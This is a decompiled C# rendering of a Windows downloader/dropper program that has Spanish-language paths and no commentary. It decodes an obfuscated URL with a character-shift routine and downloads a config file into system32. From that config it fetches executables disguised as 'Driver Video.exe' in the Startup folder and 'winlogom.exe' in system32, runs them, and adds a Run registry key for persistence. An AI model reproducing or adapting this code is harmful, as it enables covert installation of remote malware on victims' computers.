using System;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApplication1.My;

namespace WindowsApplication1;

[StandardModule]
internal sealed class Module1
{
	public static object Line;

	public static string Encriptado;

	[STAThread]
	public static void main()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 429:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0014;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_0045;
						case 6:
							goto IL_006c;
						case 7:
							goto IL_0081;
						case 8:
						case 9:
							goto IL_00bc;
						case 10:
							goto IL_00d3;
						case 11:
							goto IL_0110;
						case 12:
							goto IL_0118;
						case 13:
							goto IL_0129;
						case 14:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 15:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0129:
					num = 13;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\lk");
					break;
					IL_0118:
					num = 12;
					Interaction.Shell("C:\\Documents and Settings\\All Users\\Menú Inicio\\Programas\\Inicio\\Driver Video.exe", (AppWinStyle)0, false, -1);
					goto IL_0129;
					IL_0008:
					num = 2;
					Lk("~ŠŠ†PEEƒ‹‰\u007fywˆ…ŽE\u007fƒw}{‰E‚\u007f„\u0081‰H");
					goto IL_0014;
					IL_0014:
					num = 3;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\lk");
					goto IL_002a;
					IL_002a:
					num = 4;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Encriptado, "C:\\WINDOWS\\system32\\lk");
					goto IL_0045;
					IL_0045:
					num = 5;
					Line = Strings.Split(((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText("C:\\WINDOWS\\system32\\lk"), "\t", -1, (CompareMethod)0);
					goto IL_006c;
					IL_006c:
					num = 6;
					if (Operators.CompareString(Application.get_ExecutablePath(), "C:\\update.exe", false) != 0)
					{
						goto IL_0081;
					}
					goto IL_00bc;
					IL_0081:
					num = 7;
					Interaction.Shell("C:\\Archivos de programa\\Internet Explorer\\IEXPLORE.EXE " + Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 5 }, (string[])null))), (AppWinStyle)1, false, -1);
					goto IL_00bc;
					IL_00bc:
					num = 9;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Documents and Settings\\All Users\\Menú Inicio\\Programas\\Inicio\\Driver Video.exe");
					goto IL_00d3;
					IL_00d3:
					num = 10;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 6 }, (string[])null))), "C:\\Documents and Settings\\All Users\\Menú Inicio\\Programas\\Inicio\\Driver Video.exe");
					goto IL_0110;
					IL_0110:
					num = 11;
					Registro();
					goto IL_0118;
					end_IL_0000_2:
					break;
				}
				num = 14;
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\Documents and Settings\\All Users\\Menú Inicio\\Programas\\Inicio\\waa.exe");
				ProjectData.EndApp();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 429;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void Lk(string Clave)
	{
		Encriptado = "";
		int num = Strings.Len(Clave);
		for (int i = 1; i <= num; i = checked(i + 1))
		{
			object obj = Strings.Asc(Strings.Mid(Clave, i, 1));
			obj = Operators.SubtractObject(obj, (object)32);
			string text = Conversions.ToString(Strings.Chr(Conversions.ToInteger(Operators.AddObject(obj, (object)10))));
			Encriptado += text;
		}
	}

	public static void Registro()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object objectValue = default(object);
		object obj = default(object);
		object obj2 = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 288:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0020;
						case 4:
							goto IL_005d;
						case 5:
							goto IL_0066;
						case 6:
							goto IL_006f;
						case 7:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 8:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_006f:
					num = 6;
					objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("wscript.shell", ""));
					break;
					IL_0066:
					num = 5;
					obj = "C:\\WINDOWS\\system32\\winlogom.exe";
					goto IL_006f;
					IL_0009:
					num = 2;
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("C:\\WINDOWS\\system32\\winlogom.exe");
					goto IL_0020;
					IL_0020:
					num = 3;
					((ServerComputer)MyProject.Computer).get_Network().DownloadFile(Strings.Trim(Conversions.ToString(NewLateBinding.LateIndexGet(Line, new object[1] { 6 }, (string[])null))), "C:\\WINDOWS\\system32\\winlogom.exe");
					goto IL_005d;
					IL_005d:
					num = 4;
					obj2 = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\System";
					goto IL_0066;
					end_IL_0000_2:
					break;
				}
				num = 7;
				object obj3 = objectValue;
				object[] array = new object[2]
				{
					RuntimeHelpers.GetObjectValue(obj2),
					RuntimeHelpers.GetObjectValue(obj)
				};
				bool[] array2 = new bool[2] { true, true };
				NewLateBinding.LateCall(obj3, (Type)null, "regwrite", array, (string[])null, (Type[])null, array2, true);
				if (array2[0])
				{
					obj2 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				if (array2[1])
				{
					obj = RuntimeHelpers.GetObjectValue(array[1]);
				}
				break;
				end_IL_0000:;
			}
			catch (object obj4) when (obj4 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj4);
				try0000_dispatch = 288;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
